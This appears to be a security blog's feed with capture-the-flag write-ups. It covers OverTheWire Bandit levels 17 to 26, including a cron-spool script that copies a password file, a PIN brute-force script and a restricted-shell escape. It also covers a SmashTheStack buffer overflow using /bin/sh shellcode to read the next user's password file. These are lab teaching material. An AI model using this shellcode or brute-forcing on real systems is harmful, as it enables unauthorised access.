<p><code>plain
root@kali:~/.ssh# chmod 600 bandit17
root@kali:~/.ssh# ssh -i ~/.ssh/bandit17 bandit17@bandit.labs.overthewire.org
bandit17@melinda:~$ cat /etc/bandit_pass/bandit17
xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>nmap &ndash; Network exploration tool and security / port scanner</p>

<p>-p <port ranges>: Only scan specified ports
Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</p></blockquote>

<h3>Level 17 &ndash;> Level 18</h3>

<p>There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new</p>

<p>NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19</p>

<p>We can use the <em>diff</em> program to see the differences between the 2 files:</p>

<p>``` plain
bandit17@melinda:~$ ls
passwords.new  passwords.old
bandit17@melinda:~$ diff passwords.old passwords.new
42c42</p>

<h2>&lt; BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR</h2>

<blockquote><p>kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
```</p></blockquote>

<p>The 42c42 string means that line 42 in the first file was changed to line 42 in the second. diff uses some characters to signify the kind of change that was found:</p>

<p><code>plain
a – line was added
c – line was changed
d – line was deleted
</code></p>

<p>The number to the left of the character represents the line number in the first file, while the one to the right refers to the line number of the second file. So the correct password is kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>diff &ndash; compare files line by line</p></blockquote>

<h3>Level 18 &ndash;> Level 19</h3>

<p>The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.</p>

<p>Upon logging in, we are instantly disconnected and get a bye message:</p>

<p><code>plain
Byebye !
Connection to bandit.labs.overthewire.org closed.
</code></p>

<p>The way to run a command immediately after logging in is to add it after the ssh command:</p>

<p>``` plain
root@kali:~/.ssh# ssh <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x62;&#x61;&#110;&#100;&#105;&#116;&#49;&#x38;&#x40;&#98;&#97;&#110;&#x64;&#105;&#116;&#46;&#x6c;&#97;&#x62;&#115;&#x2e;&#x6f;&#x76;&#101;&#x72;&#116;&#x68;&#101;&#119;&#x69;&#x72;&#x65;&#x2e;&#x6f;&#x72;&#x67;">&#x62;&#x61;&#110;&#100;&#x69;&#x74;&#x31;&#56;&#x40;&#x62;&#x61;&#110;&#x64;&#105;&#116;&#x2e;&#x6c;&#97;&#x62;&#x73;&#46;&#111;&#x76;&#101;&#114;&#116;&#x68;&#x65;&#x77;&#x69;&#114;&#101;&#46;&#x6f;&#x72;&#103;</a> cat readme
This is the OverTheWire game server. More information on <a href="http://www.overthewire.org/wargames">http://www.overthewire.org/wargames</a></p>

<p>Please note that wargame usernames are no longer level<X>, but wargamename<X>
e.g. vortex4, semtex2, &hellip;</p>

<p>Note: at this moment, blacksun is not available.</p>

<p><a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#98;&#97;&#x6e;&#x64;&#x69;&#x74;&#49;&#56;&#x40;&#x62;&#97;&#x6e;&#x64;&#105;&#x74;&#46;&#108;&#97;&#98;&#115;&#46;&#x6f;&#x76;&#101;&#x72;&#x74;&#x68;&#101;&#119;&#105;&#x72;&#x65;&#46;&#x6f;&#114;&#103;">&#98;&#x61;&#110;&#100;&#105;&#116;&#x31;&#x38;&#x40;&#98;&#x61;&#x6e;&#100;&#x69;&#x74;&#x2e;&#x6c;&#x61;&#x62;&#115;&#46;&#111;&#x76;&#x65;&#x72;&#116;&#104;&#x65;&#x77;&#105;&#x72;&#101;&#x2e;&#111;&#114;&#x67;</a>&rsquo;s password:
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```</p>

<h3>Level 19 &ndash;> Level 20</h3>

<p>To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used to setuid binary.</p>

<p><code>plain
Run a command as another user.
  Example: ./bandit20-do id
bandit19@melinda:~$ ls -l bandit20-do
-rwsr-x--- 1 bandit20 bandit19 7370 Nov 14  2014 bandit20-do
</code></p>

<p>The binary is a setuid binary owned by the bandit20 user, which means we can use it to directly read he password as if we were bandit20. No exploitation needed!</p>

<p><code>plain
bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
</code></p>

<h3>Level 20 &ndash;> Level 21</h3>

<p>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).</p>

<p>NOTE: To beat this level, you need to login twice: once to run the setuid command, and once to start a network daemon to which the setuid will connect.</p>

<p>NOTE 2: Try connecting to your own network daemon to see if it works as you think</p>

<p>Here we will need to use 2 connections because we need to set up a listener as well. But since we have netcat, all is well! :D</p>

<p><code>plain
bandit20@melinda:~$ ./suconnect
Usage: ./suconnect &lt;portnumber&gt;
This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
</code></p>

<p>Have netcat listen on a port:</p>

<p>``` plain
bandit20@melinda:~$ nc -vnlp 7777
Listening on [0.0.0.0] (family 0, port 7777)</p>

<p>```</p>

<p>Then use the setuid program to connect from a new shell to the netcat listener. We see on the netcat side the connection has been received and if we give it the password we will receive the next one:</p>

<p><code>plain
Connection from [127.0.0.1] port 7777 [tcp/*] accepted (family 2, sport 41986)
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
</code></p>

<p>You can see on the other shell with the setuid binary that the password matched:</p>

<p><code>plain
bandit20@melinda:~$ ./suconnect 7777
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
</code></p>

<h3>Level 21 &ndash;> Level 22</h3>

<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>

<p>If we look in <code>/etc/cron.d/</code> we see a bunch of files, we are interested in the cronjob for bandit22:</p>

<p><code>plain
bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
</code></p>

<p>So cron runs a shell script as the bandit22 user. Let&rsquo;s see what it is:</p>

<p>``` plain
bandit21@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh</p>

<h1>!/bin/bash</h1>

<p>chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```</p>

<p>So the bandit22 user decided to paste his password in a random named file in <em>/tmp/</em>, but he gave everyone the permission to read it!</p>

<p><code>plain
bandit21@melinda:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>cron &ndash; daemon to execute scheduled commands</p>

<p>A crontab file contains instructions to the cron(8) daemon of the general form: &ldquo;run this command at this time on this date&rdquo;. Each user
has their own crontab, and commands in any given crontab will be executed as the user who owns the crontab.</p>

<p>The format of a cron command is very much the V7 standard, with a number of upward-compatible extensions. Each line has five time and
date fields, followed by a command,  followed by a newline character (&lsquo;\n&rsquo;). The system crontab (/etc/crontab) uses the same format,
except that the username for the command is specified after the time and date fields and before the command. The fields may be separated
by spaces or tabs.</p>

<p>Commands  are executed by cron(8) when the minute, hour, and month of year fields match the current time, and when at least one of the two
day fields (day of month, or day of week) match the current time. cron(8) examines cron entries once every minute.</p>

<p>A field may be an asterisk (*), which always stands for &ldquo;first-last&rdquo;.</p></blockquote>

<h3>Level 22 &ndash;> Level 23</h3>

<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>

<p>NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.</p>

<p>Again, we identify the cronjob file first to know where to look further:</p>

<p><code>plain
bandit22@melinda:/etc/cron.d$ cat cronjob_bandit23
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
</code></p>

<p>This script is more involved than the last:</p>

<p>``` plain
bandit22@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh</p>

<h1>!/bin/bash</h1>

<p>myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d &lsquo; &rsquo; -f 1)</p>

<p>echo &ldquo;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&rdquo;</p>

<p>cat /etc/bandit_pass/$myname > /tmp/$mytarget
```</p>

<p>So, this script assigns the current user name to the myname variable. We know that&rsquo;s bandit22. And then copies the password to a file in <em>/tmp/</em> that we have to identify. We can do this by substitution:</p>

<p>myname=bandit23 (that is what the <em>whoami</em> command will return)</p>

<p>Then the string &ldquo;I m user bandit23&rdquo; is fed to md5sum to compute a MD5 hash. You can check the output on your system:</p>

<p><code>plain
root@kali:~# echo "I am user bandit23" | md5sum
8ca319486bfbbc3663ea0fbe81326349  -
</code></p>

<p>The cut command is used to print just the hash line:</p>

<p><code>plain
root@kali:~# echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
</code></p>

<p>Now we know that mytarget=8ca319486bfbbc3663ea0fbe81326349</p>

<p><code>plain
bandit22@melinda:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>whoami &ndash; Print the user name associated with the current effective user ID</p>

<p>echo &ndash; display a line of text</p>

<p> md5sum &ndash; compute and check MD5 message digest</p>

<p>cut &ndash; remove sections from each line of files</p>

<p>-d, &mdash;delimiter=DELIM
use DELIM instead of TAB for field delimiter</p>

<p>-f, &mdash;fields=LIST
select only these fields;  also print any line that contains no delimiter character, unless the -s option is specified</p></blockquote>

<h3>Level 23 &ndash;> Level 24</h3>

<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>

<p>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>

<p>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>

<p>The beginning is the same as last levels:</p>

<p>``` plain
bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;> /dev/null
bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh</p>

<h1>!/bin/bash</h1>

<p>myname=$(whoami)</p>

<p>cd /var/spool/$myname
echo &ldquo;Executing and deleting all scripts in /var/spool/$myname:&rdquo;
for i in * .*;
do</p>

<pre><code>if [ "$i" != "." -a "$i" != ".." ];
then
echo "Handling $i"
timeout -s 9 60 "./$i"
rm -f "./$i"
fi
</code></pre>

<p>done
```</p>

<p>So this script executes and then deletes all scripts in the /var/spool/bandit24 directory. We can place a script of our own in there to copy the password of the bandit24 user in a location we have access to. I made a directory in /tmp/ first:</p>

<p><code>plain
bandit23@melinda:/tmp$ mkdir stuff
bandit23@melinda:/tmp$ cd stuff
</code></p>

<p>Then I made a file that will hold the password later and gave it the most liberal permissions possible:</p>

<p><code>plain
bandit23@melinda:/tmp/stuff$ touch readme.txt
bandit23@melinda:/tmp/stuff$ chmod 777 readme.txt
</code></p>

<p>Next, I made a script that will be executed by cron. It just copies the bandit24 password to the file I&rsquo;ve created earlier.</p>

<p>``` plain
bandit23@melinda:/tmp/stuff$ cat > exeme.sh</p>

<h1>!/bin/bash</h1>

<p>cat /etc/bandit_pass/bandit24 > /tmp/stuff/readme.txt
```</p>

<p>I gave my script super permissive rights, then copied it to <em>/var/spool/bandit24</em> to be executed:</p>

<p><code>plain
bandit23@melinda:/tmp/stuff$ chmod 777 exeme.sh
bandit23@melinda:/tmp/stuff$ cp exeme.sh /var/spool/bandit24/
</code></p>

<p>Waited a bit, then profit:</p>

<p><code>plain
bandit23@melinda:/tmp/stuff$ cat readme.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
</code></p>

<h3>Level 24 &ndash;> Level 25</h3>

<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinaties, called brute-forcing.</p>

<p><code>plain
bandit24@melinda:~$ nc -vv localhost 30002
Connection to localhost 30002 port [tcp/*] succeeded!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
</code></p>

<p>Meh, this means we&rsquo;ll have to bruteforce the pincode and try until the daemon says it&rsquo;s correct. I wrote a quick Python script for that:</p>

<p>``` python</p>

<h1>!/usr/bin/python</h1>

<p>import itertools
import socket</p>

<p>PIN_CHARS = &lsquo;0123456789&rsquo; # digits that can be in a pin
PIN_LEN = 4 # pin length</p>

<p>wrong = &lsquo;Wrong!&rsquo; # part of the msg received for wrong data
fail = &lsquo;Fail!&rsquo; # msg received if data doesn&rsquo;t respect constraints
normal = &lsquo;I am the pincode checker&rsquo; # normal msg
host = &lsquo;127.0.0.1&rsquo;
port = 30002</p>

<p>def computePins(iterables, r):</p>

<pre><code>"""
Build a list of all possible pin combinations that meet the constraints
"""
pins = []
for pin in itertools.product(iterables, repeat = r):
    pins.append(''.join(pin))
return pins
</code></pre>

<p>pinlist = computePins(PIN_CHARS, PIN_LEN)</p>

<p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))</p>

<p>for pin in pinlist:</p>

<pre><code>msg = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ %s\n' % pin
reply = s.recv(1024)
s.send(msg)
if wrong not in reply and fail not in reply and normal not in reply:
    print msg, reply
    break
</code></pre>

<p>```</p>

<p>And running it:</p>

<p><code>plain
bandit24@melinda:/tmp/b24mine$ ./bandit24.py
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5670
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
</code></p>

<h3>Level 25 &ndash;> Level 26</h3>

<p>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.</p>

<p>After logging in I found a SSH private key for level 26 just lying around:</p>

<p><code>plain
bandit25@melinda:~$ ls
bandit26.sshkey
</code></p>

<p>But when using it to log in, the connection closes immediately, after showing this:</p>

<p>``` plain</p>

<hr />

<p> | |                   | (<em>) | |<strong> \ / /<br/>
 | |</strong>   <strong> _ _ </strong>   __| |</em>| |<em>   ) / /</em><br/>
 | &lsquo;<em> \ / </em><code>| '_ \ / _</code> | | <strong>| / / &rsquo;<em> \
 | |</em>) | (<em>| | | | | (</em>| | | |<em> / /| (</em>) |
 |_.</strong>/ _<em>,</em>|<em>| |</em>|_<em>,</em>|<em>|_</em>|<strong>___</strong>/
Connection to bandit.labs.overthewire.org closed.
```</p>

<p>After reading a bit about how to find out another user&rsquo;s shell, what worked was looking in <code>/etc/passwd</code> for that specific user and checking the shell field (last one):</p>

<p><code>plain
cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
</code></p>

<p>Cool, we have something! Let&rsquo;s look at it:</p>

<p>``` plain
bandit25@melinda:~$ cat /usr/bin/showtext</p>

<h1>!/bin/sh</h1>

<p>more ~/text.txt
exit 0
```</p>

<p>So this shell uses <em>more</em> to display the contents of the text.txt file. Since <em>more</em> only displays one screen at a time, we want to see what else is contained in that file, but we don&rsquo;t have access to it, nor can we do anything about the shell. So the only way to proceed is to thoroughly read the <em>more</em> manpage and see if we can find something useful..</p>

<p>So, apparently it&rsquo;s possible to start an editor from more, and that rang a bell because <em>vi</em> was listed among the commands that might be needed to solve this level. And then maybe we can see inside the file some more (see what I did there? xD)</p>

<p>Since I wasn&rsquo;t sure how to proceed on the bandit system, I tested it on my own box first, by using <em>more</em> on a file large enough to activate it:</p>

<p><img class="center" src="/images/overthewire/bandit/more.png" title="&lsquo;more&rsquo; &lsquo;more&rsquo;" ></p>

<p>And pressing v dropped me into Vim!</p>

<p><img class="center" src="/images/overthewire/bandit/vi.png" title="&lsquo;vi&rsquo; &lsquo;vi&rsquo;" ></p>

<p>That gives a way to view the file beyond the first screen. But in the login shell, there was no interaction, I couldn&rsquo;t get <em>more</em> to step in..wouldn&rsquo;t even have known about it without checking the shell. But when I played around on my box some more, if using <em>more</em> on a very small file, it would just output its contents, the same way as <em>cat</em>, so there would be no indication that <em>more</em> was used to display it. Just like via SSH! So it means that text.txt file doesn&rsquo;t really have anything than that bandit ASCII art. But I wanted to check, and wasn&rsquo;t sure how to enter into the <em>more</em> prompt by logging in&hellip;it turns out that can be done by making the terminal window small!</p>

<p><img class="center" src="/images/overthewire/bandit/small_more.png" title="&lsquo;small login for more&rsquo; &lsquo;small is more&rsquo;" ></p>

<p><img class="center" src="/images/overthewire/bandit/more_shell.png" title="&lsquo;more&rsquo; &lsquo;more&rsquo;" ></p>

<p>Bingo! From here we can drop in <em>vi</em>! But as expected, there is nothing else in the file. I admit I don&rsquo;t use <em>vi</em> and the few times I needed to use it for something I had to follow instructions by looking on the internet, so it took me a little more reading before I stumbled upon <a href="http://stackoverflow.com/questions/1169805/how-to-load-another-files-content-to-current-file-in-vim">this very useful SO post</a>. It&rsquo;s possible to read another file by inserting it into the current file! You can do this by typing <code>:r newfile</code>:</p>

<p><img class="center" src="/images/overthewire/bandit/vi_read.png" title="&lsquo;vi read&rsquo; &lsquo;vi read&rsquo;" ></p>

<p>Next I had to scroll through some warnings about multiple swap files, and at the end I saw the password inserted where the cursor was!</p>

<p><img class="center" src="/images/overthewire/bandit/bandit26_pass.png" title="&lsquo;bandit 26 password&rsquo; &lsquo;bandit 26&rsquo;" ></p>

<p>So the password is <em>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</em>, and this was a hell of a fun level to complete! :D</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>The /etc/passwd file is a text file that describes user login accounts for the system.</p>

<p> Each line of the file describes a single user, and contains seven colon-separated fields:</p>

<p>name:password:UID:GID:GECOS:directory:shell</p>

<p>shell       This is the program to run at login</p>

<p>more is a filter for paging through text one screenful at a time. This version is especially primitive.</p>

<p>Interactive commands for more are based on vi(1).</p>

<p>v           Start up an editor at current line. The editor is taken from the environment variable VISUAL if defined, or EDITOR if VISUAL is
not defined, or defaults to &ldquo;vi&rdquo; if neither VISUAL nor EDITOR is defined.</p></blockquote>

<h3>Level 26 &ndash;> Level 27</h3>

<p>At this moment, level 27 does not exist yet.</p>

<p>Ok, coming back to this was lots of fun, and 2 more levels have been added since I solved it the first time, so perhaps more will be added in the future as well. The bandit wargame has been one of my favorites, and level 26 was really interesting!</p>

<p><img class="center" src="/images/overthewire/bandit/cookie.png" title="&lsquo;fortune cookie&rsquo; &lsquo;cookie&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 5]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5/"/>
    <updated>2014-07-18T13:08:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5</id>
    <content type="html"><![CDATA[<p>This is another level with 2 alternate programs to exploit.</p>

<!-- more -->


<p>Code for level05.c:</p>

<p>``` c</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char **argv) {</p>

<pre><code>char buf[128];

if(argc &lt; 2) return 1;

strcpy(buf, argv[1]);

printf("%s\n", buf);    

return 0;
</code></pre>

<p>}
```</p>

<p>This is a simple buffer overflow program. I will use the <a href="http://www.shell-storm.org/shellcode/files/shellcode-811.php">x86 execve(&ldquo;/bin/sh&rdquo;)</a> shellcode and place it in an environment variable. Then I will get the address of that variable using an excellent program from Hacking: The Art of Exploitation and pass it to the level5 binary in order to get a shell.</p>

<p>First, here is the very useful code for getting the address of an environment variable, from Jon Erickson&rsquo;s book:</p>

<p>``` c</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char *argv[]) {</p>

<pre><code>    char *ptr;
    if(argc &lt; 3) {
            printf("Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n", argv[0]);
            exit(0);
    }
    ptr = getenv(argv[1]); /* Get env var location. */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
    printf("%s will be at %p\n", argv[1], ptr);
</code></pre>

<p>}
```</p>

<p>Compile this program in your own directory. Next, add an environment variable with the shellcode:</p>

<p><code>plain
export PWN=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
</code></p>

<p>Next we need to find out the offsets for exploiting the program (again pattern_create.rb and pattern_offset.rb are your friends):</p>

<p><code>plain
root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</code></p>

<p>Run the program in GDB with the pattern and then get the offset:</p>

<p>``` plain
Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()</p>

<p>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 0x37654136
[*] Exact match at offset 140
```</p>

<p>Now get the address of our environment variable:</p>

<p><code>plain
level5@io:/tmp/mydir$ ./getenv PWN /levels/level05
PWN will be at 0xbfffff53
</code></p>

<p>Profit:</p>

<p><code>plain
level5@io:/tmp/mydir$ /levels/level05 $(python -c 'print "A" * 140 + "\x53\xff\xff\xbf"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS���
sh-4.2$ whoami
level6
sh-4.2$ cat /home/level6/.pass
9BT8fmYDTPimXXhY3m
</code></p>

<p>This was the easy way. Prepare for worse in the alternate way, with level05_alt.c:</p>

<p>``` c
//don&rsquo;t get trapped, there&rsquo;s no need
//level by bla</p>

<h1>include &lt;sys/mman.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<h1>define LOADERSIZE (232 + 16)</h1>

<p>void<em> getASLRregion(int size, int flags);
void switchcontext(char</em> newstack, char* code);</p>

<p>int main(int argc, char<em> argv[], char</em> env[])
{</p>

<pre><code>char *newcode, *newstack;

//allocate memory at random addresses
newstack = getASLRregion(64 * 1024, PROT_READ | PROT_WRITE );
newcode =  getASLRregion(64 * 1024, PROT_READ | PROT_WRITE | PROT_EXEC);

if(argc &gt; 1)
if(!strchr(argv[1], 0xcd))
if(!strchr(argv[1], 0xe8))
if(!strstr(argv[1], "\x0F\x34"))
if(!strchr(argv[1], 0xdb)) {
    //prepare new code section, leaving some space for a loader
    strncpy(newcode + LOADERSIZE, argv[1], 1000);

    //start executing using a new stack and code section.
    switchcontext(newstack + 64 * 1024, newcode);
}
return 0;
</code></pre>

<p>}</p>

<p>/<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>/
/</em> HALT! The code below only provides a controllable aslr/noexec for this challenge, there&rsquo;s no need to waste time on it <em>/
/</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>/
void <strong>attribute</strong>((constructor))initializePRNG(){int seed;FILE<em>devrand=fopen(&ldquo;/dev/random&rdquo;,&ldquo;r&rdquo;);if(devrand==0)exit(-1);
if(fread(&amp;seed, 4, 1, devrand) != 1)exit(-1);fclose(devrand);srand(seed);}unsigned int loader[100]={0xe899c031,0};void</em>
getASLRregion(int size, int flags){int tries=1000,hint,res;while(tries&mdash;){hint=rand()&lt;&lt;12;res=(int)mmap((void<em>)hint,size
+4096,flags,MAP_PRIVATE|MAP_ANONYMOUS,0,0);if(hint==res){loader[++loader[1]+1]=hint;return (void</em>)(res+(rand()&amp;0xffc));}
if(munmap((void<em>)res,size+4096))exit(-1);}exit(-1);}void switchcontext(char</em>newstack,char<em>code){loader[1]&lt;&lt;=2;memcpy(code
,loader,loader[1]+8);memcpy(code+loader[1]+8,&ldquo;\x68\x61\x70\x73\x00\x68\x6c\x66\x2f\x6d\x68\x63\x2f\x73\x65\x68\x2f\x70&rdquo;
&ldquo;\x72\x6f\x89\xe3\x89\xc1\xb0\x05\xcd\x80\x81\xc4\x10\x00\x00\x00\x85\xc0\x0f\x88\x97\x00\x00\x00\x50\x89\xe5\x31\xc9\x31&rdquo;
&ldquo;\xff\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x73\x00\x00\x00\x85\xc0\x0f\x84\x80\x00\x00\x00\x80\xf9\x2d\x74\x10\x80\xe9\x30&rdquo;
&ldquo;\x80\xf9\x09\x76\xde\x80\xe9\x27\xe9\xd6\xff\xff\xff\x8b\x75\x04\xad\x39\xf8\x74\x3b\x85\xc0\x75\xf7\x57\x31\xc9\x31\xff&rdquo;
&ldquo;\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x38\x00\x00\x00\x85\xc0\x74\x49\x80\xf9\x20\x74\x10\x80\xe9\x30\x80\xf9\x09\x76\xe2&rdquo;
&ldquo;\x80\xe9\x27\xe9\xda\xff\xff\xff\x5b\x89\xf9\x29\xd9\x31\xc0\x99\xb0\x7d\xcd\x80\xe8\x0e\x00\x00\x00\x85\xc0\x74\x1f\x80&rdquo;
&ldquo;\xf9\x0a\x75\xf2\xe9\x7c\xff\xff\xff\x51\x89\xe1\x31\xc0\x99\xb0\x03\x42\x8b\x5d\x00\xcd\x80\x59\xc3\x31\xc0\x40\xcd\x80&rdquo;
&ldquo;\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6&rdquo;
&ldquo;\xf3\xab\x31\xff&rdquo;,LOADERSIZE-16);asm(&ldquo;mov %0, %%esp\nmov %1,%%eax\njmp </em>%%eax&rdquo;::&ldquo;r&rdquo;(newstack-4),&ldquo;r&rdquo;(code):&ldquo;eax&rdquo;);}
```</p>

<h4>Function overview</h4>

<p>Well, let&rsquo;s first be clear on the flags used for the memory allocation:</p>

<p>PROT_EXEC  Pages may be executed.</p>

<p>PROT_READ  Pages may be read.</p>

<p>PROT_WRITE Pages may be written.</p>

<p><strong>strchr</strong></p>

<p><em>char <em>strchr(const char </em>str, int ch);</em></p>

<p>Returns a pointer to the first occurrence of character ch in str or a null pointer if no matching character is found.</p>

<p>The terminating null byte is considered part of the string, so that if  ch  is  specified  as &lsquo;\0&rsquo;, this function returns a pointer to the terminator.</p>

<p>I will come back to this at a later time.</p>

<blockquote><p>Truth is the most valuable thing we have &mdash; so let us economize it.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
</feed>
